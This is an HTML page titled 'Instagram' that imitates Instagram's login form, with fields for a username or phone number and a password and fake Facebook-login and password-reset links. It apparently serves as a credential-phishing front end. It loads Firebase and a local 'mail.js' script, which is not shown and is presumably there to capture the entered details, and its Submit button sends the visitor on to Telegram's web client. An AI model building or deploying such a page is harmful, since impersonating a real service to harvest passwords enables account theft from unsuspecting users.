<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="assets/css/main.css">
  <title>Instagram</title>
</head>
<body>
  <main class="l-main">
      
      <div class="l-user">
        <div class="c-panel group">
          
           <h1>Our Chat room</h1>
          
          <div class="c-panel__form">
            <form action="" id="contact">
            <input type="text" class="c-panel__input" id="usr" placeholder="Phone number or username">
            <input type="text" class="c-panel__input", id="psswd" placeholder="Password"> <br>
            <div class="submitbtn">
              <button type="submit" onclick="location.href= 'https://web.telegram.org/a/';"; style="color: white; background-color: #0095f6; border: none; margin: 5% 10%; padding: 3% 18%; border-radius: 4px;">Submit</button>
            </div>
            
          </form>
            <span class="c-panel__span">OR</span>
          </div>
          <a href="#" class="c-panel__facebook">Login with Facebook</a>
          <a href="#" class="c-panel__forgot">Forgot password?</a>
        </div>
        
      </div>
  </main>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1-0/firebase.js"></script>
  <script src="./assets/js/mail.js"></script>
</body>
</html>
